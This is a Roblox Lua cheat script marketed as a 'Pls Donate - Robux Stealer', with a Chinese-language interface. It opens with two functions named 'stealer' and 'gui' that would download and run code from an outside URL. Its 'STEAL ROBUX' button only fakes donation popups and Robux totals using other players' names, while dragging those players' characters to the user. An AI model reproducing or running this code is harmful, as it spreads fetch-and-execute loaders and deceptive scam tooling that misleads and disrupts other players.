local function stealer()
    loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/rtw9beM6UZRB8KRh/raw'))()
end
local function gui()
    loadstring(game:HttpGet('https://api.rubis.app/v2/scrap/rtw9beM6UZRB8KRh/raw'))()
end

shared.LoaderTitle = "免费开源倒卖私募"
shared.LoaderKeyFrames = {
    [1] = { 1, 10 },
    [2] = { 2, 30 },
    [3] = { 3, 60 },
    [4] = { 2, 100 }
}

local v2 = {
    LoaderData = {
        Name = shared.LoaderTitle or "A Loader",
        Colors = shared.LoaderColors or {
            Main = Color3.fromRGB(0, 0, 0),
            Topic = Color3.fromRGB(200, 200, 200),
            Title = Color3.fromRGB(255, 255, 255),
            LoaderBackground = Color3.fromRGB(40, 40, 40),
            LoaderSplash = Color3.fromRGB(130, 36, 212)
        }
    },
    Keyframes = shared.LoaderKeyFrames or {
        [1] = { 1, 10 }, [2] = { 2, 30 }, [3] = { 3, 60 }, [4] = { 2, 100 }
    }
}

local v3 = { [1] = "", [2] = "", [3] = "", [4] = "" }

function TweenObject(v178, v179, v180)
    game.TweenService:Create(v178, TweenInfo.new(v179, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), v180):Play()
end

function CreateObject(v181, v182)
    local v183 = Instance.new(v181)
    local v184
    for v416, v417 in pairs(v182) do
        if v416 ~= "Parent" then
            v183[v416] = v417
        else
            v184 = v417
        end
    end
    v183.Parent = v184
    return v183
end

local function v4(v186, v187)
    local v188 = Instance.new("UICorner")
    v188.CornerRadius = UDim.new(0, v186)
    v188.Parent = v187
end

local v5 = CreateObject("ScreenGui", { Name = "Core", Parent = game.CoreGui })
local v6 = CreateObject("Frame", {
    Name = "Main", Parent = v5, BackgroundColor3 = v2.LoaderData.Colors.Main,
    BorderSizePixel = 0, ClipsDescendants = true,
    Position = UDim2.new(0.5, 0, 0.5, 0), AnchorPoint = Vector2.new(0.5, 0.5),
    Size = UDim2.new(0, 0, 0, 0)
})
v4(12, v6)

local v7 = CreateObject("ImageLabel", {
    Name = "UserImage", Parent = v6, BackgroundTransparency = 1,
    Image = "rbxassetid://84469282453789",
    Position = UDim2.new(0, 15, 0, 10), Size = UDim2.new(0, 50, 0, 50)
})
v4(25, v7)

local v8 = CreateObject("TextLabel", {
    Name = "UserName", Parent = v6, BackgroundTransparency = 1,
    Text = "免费开源倒卖私募", Position = UDim2.new(0, 75, 0, 10),
    Size = UDim2.new(0, 200, 0, 50), Font = Enum.Font.GothamBold,
    TextColor3 = v2.LoaderData.Colors.Title, TextSize = 14,
    TextXAlignment = Enum.TextXAlignment.Left
})

local v9 = CreateObject("TextLabel", {
    Name = "Top", TextTransparency = 1, Parent = v6,
    BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 1,
    Position = UDim2.new(0, 30, 0, 70), Size = UDim2.new(0, 301, 0, 20),
    Font = Enum.Font.Gotham, Text = "Loader", TextColor3 = v2.LoaderData.Colors.Topic,
    TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left
})

local v10 = CreateObject("TextLabel", {
    Name = "Title", Parent = v6, TextTransparency = 1,
    BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 1,
    Position = UDim2.new(0, 30, 0, 90), Size = UDim2.new(0, 301, 0, 46),
    Font = Enum.Font.Gotham, RichText = true,
    Text = "<b>" .. v2.LoaderData.Name .. "</b>",
    TextColor3 = v2.LoaderData.Colors.Title, TextSize = 14,
    TextXAlignment = Enum.TextXAlignment.Left
})

local v11 = CreateObject("Frame", {
    Name = "BG", Parent = v6, AnchorPoint = Vector2.new(0.5, 0),
    BackgroundTransparency = 1, BackgroundColor3 = v2.LoaderData.Colors.LoaderBackground,
    BorderSizePixel = 0, Position = UDim2.new(0.5, 0, 0, 70),
    Size = UDim2.new(0.8500000238418579, 0, 0, 24)
})
v4(8, v11)

local v12 = CreateObject("Frame", {
    Name = "Progress", Parent = v11,
    BackgroundColor3 = v2.LoaderData.Colors.LoaderSplash, BackgroundTransparency = 1,
    BorderSizePixel = 0, Size = UDim2.new(0, 0, 0, 24)
})
v4(8, v12)

local v13 = CreateObject("TextLabel", {
    Name = "StepLabel", Parent = v6, BackgroundTransparency = 1,
    Position = UDim2.new(0.5, 0, 1, -25), Size = UDim2.new(1, -20, 0, 20),
    Font = Enum.Font.Gotham, Text = "", TextColor3 = v2.LoaderData.Colors.Topic,
    TextSize = 14, TextXAlignment = Enum.TextXAlignment.Center,
    AnchorPoint = Vector2.new(0.5, 0.5)
})

function UpdateStepText(v191)
    v13.Text = v3[v191] or ""
end

function UpdatePercentage(v193, v194)
    TweenObject(v12, 0.5, { Size = UDim2.new(v193 / 100, 0, 0, 24) })
    UpdateStepText(v194)
end

TweenObject(v6, 0.25, { Size = UDim2.new(0, 346, 0, 121) })
wait()
TweenObject(v9, 0.5, { TextTransparency = 0 })
TweenObject(v10, 0.5, { TextTransparency = 0 })
TweenObject(v11, 0.5, { BackgroundTransparency = 0 })
TweenObject(v12, 0.5, { BackgroundTransparency = 0 })

for v195, v196 in pairs(v2.Keyframes) do
    wait(v196[1])
    UpdatePercentage(v196[2], v195)
end
UpdatePercentage(100, 4)

TweenObject(v9, 0.5, { TextTransparency = 1 })
TweenObject(v10, 0.5, { TextTransparency = 1 })
TweenObject(v11, 0.5, { BackgroundTransparency = 1 })
TweenObject(v12, 0.5, { BackgroundTransparency = 1 })
wait(0.5)
TweenObject(v6, 0.25, { Size = UDim2.new(0, 0, 0, 0) })
wait(0.25)
v5:Destroy()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")
local Debris = game:GetService("Debris")
local RunService = game:GetService("RunService")
local TeleportService = game:GetService("TeleportService")

local PUSH_FIRST = true
local PUSH_DURATION = 6
local PUSH_INTERVAL = 0.05
local NEAR_RADIUS = 0.2
local SPAWN_DELAY = 0.1
local MAX_VALUE = 15000
local NUM_PER_PLAYER = 1
local totalDonatedVisual = 0

local UITemplates = PlayerGui:FindFirstChild("UITemplates")
local DONATION_TEMPLATE
local POPUPS_FOLDER
do
    if UITemplates and UITemplates:FindFirstChild("donationPopup") then
        DONATION_TEMPLATE = UITemplates:FindFirstChild("donationPopup")
    end
    local existingGui
    for _, child in ipairs(PlayerGui:GetChildren()) do
        if child:IsA("ScreenGui") and child:FindFirstChild("Popups", true) then
            existingGui = child
            break
        end
    end
    if DONATION_TEMPLATE and existingGui then
        POPUPS_FOLDER = existingGui:FindFirstChild("Popups", true)
    end

    if not DONATION_TEMPLATE then
        local templateGui = existingGui
        if not templateGui then
            templateGui = Instance.new("ScreenGui")
            templateGui.Name = "MozilDonateTemplateGui"
            templateGui.ResetOnSpawn = false
            templateGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            templateGui.Parent = PlayerGui
        end
        local popupFrame = Instance.new("Frame")
        popupFrame.Name = "donationPopup"
        popupFrame.AnchorPoint = Vector2.new(0.5, 0)
        popupFrame.Position = UDim2.new(0.5, 0, 0.1, 0)
        popupFrame.Size = UDim2.new(0, 350, 0, 60)
        popupFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
        popupFrame.BackgroundTransparency = 0.1
        popupFrame.BorderSizePixel = 0
        popupFrame.Parent = templateGui

        local popupCorner = Instance.new("UICorner")
        popupCorner.CornerRadius = UDim.new(0, 10)
        popupCorner.Parent = popupFrame

        local messageLabel = Instance.new("TextLabel")
        messageLabel.Name = "Message"
        messageLabel.BackgroundTransparency = 1
        messageLabel.Position = UDim2.new(0, 10, 0, 10)
        messageLabel.Size = UDim2.new(1, -20, 1, -20)
        messageLabel.Font = Enum.Font.GothamBold
        messageLabel.Text = ""
        messageLabel.TextColor3 = Color3.new(1, 1, 1)
        messageLabel.TextSize = 20
        messageLabel.TextWrapped = true
        messageLabel.TextXAlignment = Enum.TextXAlignment.Left
        messageLabel.Parent = popupFrame

        local uiScale = Instance.new("UIScale")
        uiScale.Parent = popupFrame

        DONATION_TEMPLATE = popupFrame
    end

    if not POPUPS_FOLDER then
        local popGui = Instance.new("ScreenGui")
        popGui.Name = "MozilDonatePopups"
        popGui.ResetOnSpawn = false
        popGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        popGui.Parent = PlayerGui
        POPUPS_FOLDER = Instance.new("Folder")
        POPUPS_FOLDER.Name = "Popups"
        POPUPS_FOLDER.Parent = popGui
    end
end

local function formatNumber(n)
    local s = tostring(n)
    s = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
    if s:sub(1, 1) == "," then s = s:sub(2) end
    return s
end

local SPECIAL_SMALL = { 1, 2, 5, 10, 15, 20, 50, 75 }
local function nearestSpecialSmall(v)
    local best = SPECIAL_SMALL[1]
    local bestDiff = math.huge
    for _, x in ipairs(SPECIAL_SMALL) do
        local d = math.abs(v - x)
        if d < bestDiff then best = x; bestDiff = d end
    end
    return best
end

local FAVOR_MED = { { val = 100, w = 60 }, { val = 200, w = 35 }, { val = 500, w = 25 } }
local FAVOR_MED_TOTAL = 0
for _, it in ipairs(FAVOR_MED) do FAVOR_MED_TOTAL = FAVOR_MED_TOTAL + it.w end

local function pickFavorMed()
    local r = math.random(1, FAVOR_MED_TOTAL)
    local acc = 0
    for _, it in ipairs(FAVOR_MED) do
        acc = acc + it.w
        if r <= acc then return it.val end
    end
    return 100
end

local function roundAmount(v)
    if v < 100 then
        return nearestSpecialSmall(v)
    elseif v < 1000 then
        if math.random() <= 0.8 then return pickFavorMed()
        else return math.floor((v + 50) / 100) * 100 end
    else
        local rounded = math.floor((v + 500) / 1000) * 1000
        return math.clamp(rounded, 1000, MAX_VALUE)
    end
end

local function weightedRandomAmount(maxValue)
    local roll = math.random(1, 10000)
    if roll <= 9500 then
        local raw = math.floor((1 - math.random() ^ 2.6) * 1000) + 1
        return roundAmount(raw)
    else
        local over10k = ({ 11000, 12000, 13000, 14000, 15000 })[math.random(1, 5)]
        return math.min(over10k, maxValue)
    end
end

local function playAmountSound(amount)
    local soundId
    if amount <= 99 then soundId = "rbxassetid://15333945695"
    elseif amount <= 999 then soundId = "rbxassetid://15333946014"
    elseif amount <= 9999 then soundId = "rbxassetid://15333945376"
    else soundId = "rbxassetid://15333945889"
    end
    local s = Instance.new("Sound")
    s.SoundId = soundId
    s.Volume = 1
    s.Parent = SoundService
    s:Play()
    Debris:AddItem(s, 6)
end

local function createDonationVisual(username, amount)
    local text = username .. " DONATED 💰" .. formatNumber(amount) .. " TO YOU!"
    local clone = DONATION_TEMPLATE:Clone()
    clone.Parent = POPUPS_FOLDER
    clone.Transparency = 1
    clone.Visible = true
    if clone:FindFirstChild("Message") then
        clone.Message.Text = text
        pcall(function() clone.Message.MaxVisibleGraphemes = 0 end)
    end
    if clone:FindFirstChild("UIScale") then
        clone.UIScale.Scale = 0
    end
    TweenService:Create(clone, TweenInfo.new(0.5, Enum.EasingStyle.Quint), { Transparency = 0 }):Play()
    if clone:FindFirstChild("UIScale") then
        TweenService:Create(clone.UIScale, TweenInfo.new(0.3, Enum.EasingStyle.Back), { Scale = 1 }):Play()
    end
    if clone:FindFirstChild("Message") then
        TweenService:Create(clone.Message, TweenInfo.new(1, Enum.EasingStyle.Quint), { MaxVisibleGraphemes = #text }):Play()
    end
    return clone
end

local function dismissDonationVisual(clone)
    if not clone then return end
    TweenService:Create(clone, TweenInfo.new(0.25), { Transparency = 1 }):Play()
    task.delay(0.5, function() if clone then clone:Destroy() end end)
end

local CoinVFX = {}
local COLLECT_SOUND_ID = "rbxassetid://6792279908"
local PROX_RADIUS = 2.5
local HOMING_DELAY = 1
local COIN_LIFETIME = 12

local function mkCoin(startPos)
    local p = Instance.new("Part")
    p.Anchored = true
    p.CanCollide = false
    p.CanTouch = true
    p.Material = Enum.Material.Neon
    p.Color = Color3.fromRGB(255, 207, 64)
    p.Size = Vector3.new(0.2, 0.9, 0.9)
    p.CFrame = CFrame.new(startPos)
    p.Parent = workspace

    local att = Instance.new("Attachment", p)
    att.Name = "Center"
    local glow = Instance.new("PointLight", att)
    glow.Range = 6
    glow.Brightness = 0.2
    local spark = Instance.new("ParticleEmitter", att)
    spark.Rate = 0
    spark.Texture = "rbxassetid://258128463"
    local snd = Instance.new("Sound", p)
    snd.SoundId = COLLECT_SOUND_ID
    snd.Volume = 1

    return p, att, glow, spark, snd
end

local function collectAndDestroy(p, glow, spark, snd)
    if not p then return end
    if glow then glow.Brightness = 1; glow.Range = 7.5 end
    if spark then spark:Emit(12) end
    if snd then snd:Play() end
    TweenService:Create(p, TweenInfo.new(0.25), { Size = Vector3.new(0, 0, 0) }):Play()
    task.delay(0.3, function() if p then p:Destroy() end end)
end

local function spawnOneCoin(startPos, targetHRP)
    local p, center, glow, spark, snd = mkCoin(startPos)
    local collected = false

    local rotConn
    rotConn = RunService.RenderStepped:Connect(function(dt)
        if not p or collected then rotConn:Disconnect(); return end
        p.Orientation = p.Orientation + Vector3.new(0, 180 * dt, 0)
    end)

    local function doCollect()
        if collected then return end
        collected = true
        collectAndDestroy(p, glow, spark, snd)
    end

    p.Touched:Connect(function(hit)
        if collected then return end
        local myChar = targetHRP and targetHRP.Parent
        if myChar and hit and hit:IsDescendantOf(myChar) then
            doCollect()
        end
    end)

    task.delay(HOMING_DELAY, function()
        if collected then return end
        if spark then spark.Enabled = true end
        local alpha = 0
        local born = os.clock()
        local hb
        hb = RunService.Heartbeat:Connect(function(dt)
            if not p or collected then hb:Disconnect(); return end
            if not targetHRP or not targetHRP.Parent then
                collected = true
                TweenService:Create(p, TweenInfo.new(0.4), { Size = Vector3.new(0, 0, 0) }):Play()
                task.delay(0.4, function() if p then p:Destroy() end end)
                hb:Disconnect()
                return
            end
            local dist = (center.WorldPosition - targetHRP.Position).Magnitude
            if dist < PROX_RADIUS then
                doCollect()
                hb:Disconnect()
                return
            end
            alpha = math.clamp(alpha + 0.05 * dt * 60 / 60, 0, 1)
            p.Position = p.Position:Lerp(targetHRP.Position, alpha)
            if os.clock() - born > COIN_LIFETIME then
                doCollect()
                hb:Disconnect()
            end
        end)
    end)
end

function CoinVFX.spawn(amount, startPos, targetChar)
    local hrp = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local delayPer = 0.1
    local count = math.clamp(math.floor(amount / 100) + 3, 5, 20)
    for i = 1, count do
        task.spawn(spawnOneCoin, startPos, hrp)
        task.wait(delayPer)
    end
end

local function showRobuxSummary(totalAmount)
    if totalAmount <= 0 then return end
    local net = math.floor(totalAmount * 0.6)
    local gui = Instance.new("ScreenGui")
    gui.Name = "hydrosRobuxSummary"
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    gui.ResetOnSpawn = false
    gui.Parent = PlayerGui

    local frame = Instance.new("Frame")
    frame.Name = "SummaryFrame"
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    frame.Size = UDim2.new(0, 0, 0, 0)
    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    frame.BackgroundTransparency = 0.1
    frame.BorderSizePixel = 0
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 14)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(0, 255, 140)
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = frame

    local title = Instance.new("TextLabel")
    title.Name = "Title"
    title.BackgroundTransparency = 1
    title.Size = UDim2.new(1, -20, 0, 28)
    title.Position = UDim2.new(0, 10, 0, 8)
    title.Font = Enum.Font.GothamBold
    title.Text = "免费开源倒卖私募"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextSize = 18
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeColor3 = Color3.new(0, 0, 0)
    title.TextStrokeTransparency = 0.5
    title.Parent = frame

    local mainText = Instance.new("TextLabel")
    mainText.Name = "MainText"
    mainText.BackgroundTransparency = 1
    mainText.Size = UDim2.new(1, -20, 0, 40)
    mainText.Position = UDim2.new(0, 10, 0, 40)
    mainText.Font = Enum.Font.GothamBold
    mainText.Text = "你得到了 " .. formatNumber(net) .. " robux 💸"
    mainText.TextColor3 = Color3.fromRGB(0, 255, 140)
    mainText.TextSize = 20
    mainText.TextWrapped = true
    mainText.TextXAlignment = Enum.TextXAlignment.Left
    mainText.TextYAlignment = Enum.TextYAlignment.Center
    mainText.TextStrokeColor3 = Color3.new(0, 0, 0)
    mainText.TextStrokeTransparency = 0.4
    mainText.Parent = frame

    local subText = Instance.new("TextLabel")
    subText.Name = "SubText"
    subText.BackgroundTransparency = 1
    subText.Size = UDim2.new(1, -20, 0, 20)
    subText.Position = UDim2.new(0, 10, 0, 78)
    subText.Font = Enum.Font.Gotham
    subText.Text = "你一共得到了: " .. formatNumber(totalAmount) .. " R$"
    subText.TextColor3 = Color3.fromRGB(200, 200, 200)
    subText.TextSize = 13
    subText.TextXAlignment = Enum.TextXAlignment.Left
    subText.TextYAlignment = Enum.TextYAlignment.Center
    subText.TextStrokeTransparency = 1
    subText.Parent = frame

    TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Size = UDim2.new(0, 280, 0, 110) }):Play()
    task.delay(5, function()
        if frame.Parent then
            TweenService:Create(frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Size = UDim2.new(0, 0, 0, 0) }):Play()
            task.delay(0.25, function() if gui then gui:Destroy() end end)
        end
    end)
end

local function pushAllToMyLastPosition(duration, interval, nearRadius)
    local player = LocalPlayer
    local char = player.Character
    if not char then return end
    local root = char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local startPos = root.Position
    local startTime = tick()
    local playersList = Players:GetPlayers()
    local pushConn
    pushConn = RunService.RenderStepped:Connect(function()
        if tick() - startTime > duration then
            if pushConn then pushConn:Disconnect() end
            return
        end
        local currentPos = root.Position
        for _, other in ipairs(playersList) do
            if other ~= player then
                local otherChar = other.Character
                if otherChar then
                    local otherRoot = otherChar:FindFirstChild("HumanoidRootPart")
                    if otherRoot then
                        local offset = (currentPos - otherRoot.Position).unit * nearRadius
                        otherRoot.CFrame = CFrame.new(currentPos + offset)
                    end
                end
            end
        end
        task.wait(interval)
    end)
end

local function spawnMultiDonations()
    totalDonatedVisual = 0
    local list = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(list, p)
        end
    end
    for i = #list, 2, -1 do
        local j = math.random(1, i)
        list[i], list[j] = list[j], list[i]
    end
    for _, ply in ipairs(list) do
        for _ = 1, NUM_PER_PLAYER do
            local username = ply.Name
            local amount = weightedRandomAmount(MAX_VALUE)
            totalDonatedVisual = totalDonatedVisual + amount
            task.spawn(function()
                playAmountSound(amount)
                local cloned = createDonationVisual(username, amount)
                local donorHRP = ply.Character and ply.Character:FindFirstChild("HumanoidRootPart")
                local startPos = donorHRP and donorHRP.Position + Vector3.new(0, 2, 0) or workspace.CurrentCamera and workspace.CurrentCamera.CFrame.Position or Vector3.new(0, 10, 0)
                CoinVFX.spawn(amount, startPos, LocalPlayer.Character)
                task.delay(4, function()
                    dismissDonationVisual(cloned)
                end)
            end)
            task.wait(SPAWN_DELAY)
        end
    end
end

local function runDonateVisualNow()
    task.spawn(function()
        if PUSH_FIRST then
            pushAllToMyLastPosition(PUSH_DURATION, PUSH_INTERVAL, NEAR_RADIUS)
        end
        spawnMultiDonations()
        showRobuxSummary(totalDonatedVisual)
    end)
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "纯免费开源，倒卖私募"
ScreenGui.Parent = PlayerGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local ToggleButton = Instance.new("ImageButton")
ToggleButton.Name = "ToggleButton"
ToggleButton.Parent = ScreenGui
ToggleButton.BackgroundTransparency = 1
ToggleButton.Image = "rbxassetid://84469282453789"
ToggleButton.Size = UDim2.new(0, 50, 0, 50)
ToggleButton.Position = UDim2.new(0, 20, 0.5, -25)
ToggleButton.Draggable = true

local ToggleButtonCorner = Instance.new("UICorner")
ToggleButtonCorner.CornerRadius = UDim.new(0, 12)
ToggleButtonCorner.Parent = ToggleButton

local MainFrame = Instance.new("Frame")
MainFrame.Name = "MainFrame"
MainFrame.Parent = ScreenGui
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -125)
MainFrame.Size = UDim2.new(0, 300, 0, 250)
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true

local MainFrameCorner = Instance.new("UICorner")
MainFrameCorner.CornerRadius = UDim.new(0, 12)
MainFrameCorner.Parent = MainFrame

local TitleLabel = Instance.new("TextLabel")
TitleLabel.Name = "TitleLabel"
TitleLabel.Parent = MainFrame
TitleLabel.BackgroundTransparency = 1
TitleLabel.Position = UDim2.new(0, 0, 0, 10)
TitleLabel.Size = UDim2.new(1, 0, 0, 30)
TitleLabel.Font = Enum.Font.GothamBold
TitleLabel.Text = "免费开源倒卖私募🌀"
TitleLabel.TextColor3 = Color3.new(1, 1, 1)
TitleLabel.TextSize = 24
TitleLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
TitleLabel.TextStrokeTransparency = 0

local SubtitleLabel = Instance.new("TextLabel")
SubtitleLabel.Name = "SubtitleLabel"
SubtitleLabel.Parent = MainFrame
SubtitleLabel.BackgroundTransparency = 1
SubtitleLabel.Position = UDim2.new(0, 0, 0, 40)
SubtitleLabel.Size = UDim2.new(1, 0, 0, 20)
SubtitleLabel.Font = Enum.Font.Gotham
SubtitleLabel.Text = "Pls Donate - Robux Stealer"
SubtitleLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
SubtitleLabel.TextSize = 14
SubtitleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
SubtitleLabel.TextStrokeTransparency = 0

local StealRobuxButton = Instance.new("TextButton")
StealRobuxButton.Name = "StealRobuxButton"
StealRobuxButton.Parent = MainFrame
StealRobuxButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
StealRobuxButton.BorderColor3 = Color3.new(0, 0, 0)
StealRobuxButton.Position = UDim2.new(0.1, 0, 0.3, 0)
StealRobuxButton.Size = UDim2.new(0.8, 0, 0.15, 0)
StealRobuxButton.Font = Enum.Font.GothamBold
StealRobuxButton.Text = "STEAL ROBUX"
StealRobuxButton.TextColor3 = Color3.new(1, 1, 1)
StealRobuxButton.TextSize = 18
StealRobuxButton.TextStrokeColor3 = Color3.new(0, 0, 0)
StealRobuxButton.TextStrokeTransparency = 0

local StealRobuxCorner = Instance.new("UICorner")
StealRobuxCorner.CornerRadius = UDim.new(0, 8)
StealRobuxCorner.Parent = StealRobuxButton

local RichSvHopButton = Instance.new("TextButton")
RichSvHopButton.Name = "RichSvHopButton"
RichSvHopButton.Parent = MainFrame
RichSvHopButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
RichSvHopButton.BorderColor3 = Color3.new(0, 0, 0)
RichSvHopButton.Position = UDim2.new(0.1, 0, 0.5, 0)
RichSvHopButton.Size = UDim2.new(0.8, 0, 0.15, 0)
RichSvHopButton.Font = Enum.Font.GothamBold
RichSvHopButton.Text = "切换服务器"
RichSvHopButton.TextColor3 = Color3.new(1, 1, 1)
RichSvHopButton.TextSize = 18
RichSvHopButton.TextStrokeColor3 = Color3.new(0, 0, 0)
RichSvHopButton.TextStrokeTransparency = 0

local RichSvHopCorner = Instance.new("UICorner")
RichSvHopCorner.CornerRadius = UDim.new(0, 8)
RichSvHopCorner.Parent = RichSvHopButton

local CreatorLabel = Instance.new("TextLabel")
CreatorLabel.Name = "CreatorLabel"
CreatorLabel.Parent = MainFrame
CreatorLabel.BackgroundTransparency = 1
CreatorLabel.Position = UDim2.new(0, 0, 0.8, 0)
CreatorLabel.Size = UDim2.new(1, 0, 0, 20)
CreatorLabel.Font = Enum.Font.Gotham
CreatorLabel.Text = "bilbil@Maokou_QwQ"
CreatorLabel.TextColor3 = Color3.new(1, 1, 1)
CreatorLabel.TextSize = 14

local RainbowLabel = Instance.new("TextLabel")
RainbowLabel.Name = "RainbowLabel"
RainbowLabel.Parent = MainFrame
RainbowLabel.BackgroundTransparency = 1
RainbowLabel.Position = UDim2.new(0, 0, 0.87, 0)
RainbowLabel.Size = UDim2.new(1, 0, 0, 20)
RainbowLabel.Font = Enum.Font.Gotham
RainbowLabel.Text = "每天只能使用20次（其实多了也没事）"
RainbowLabel.TextSize = 14

spawn(function()
    while RainbowLabel and RainbowLabel.Parent do
        for i = 0, 1, 0.01 do
            if not RainbowLabel or not RainbowLabel.Parent then
                break
            end
            RainbowLabel.TextColor3 = Color3.fromHSV(i, 1, 1)
            task.wait(0.05)
        end
    end
end)

local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Parent = MainFrame
CloseButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
CloseButton.BorderColor3 = Color3.new(0, 0, 0)
CloseButton.Position = UDim2.new(0.1, 0, 0.7, 0)
CloseButton.Size = UDim2.new(0.8, 0, 0.1, 0)
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Text = "关闭"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextSize = 16
CloseButton.TextStrokeColor3 = Color3.new(0, 0, 0)
CloseButton.TextStrokeTransparency = 0

local CloseButtonCorner = Instance.new("UICorner")
CloseButtonCorner.CornerRadius = UDim.new(0, 8)
CloseButtonCorner.Parent = CloseButton

ToggleButton.MouseButton1Click:Connect(function()
    MainFrame.Visible = not MainFrame.Visible
end)

StealRobuxButton.MouseButton1Click:Connect(function()
    task.delay(5, function()
        runDonateVisualNow()
    end)
end)

RichSvHopButton.MouseButton1Click:Connect(function()
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
end)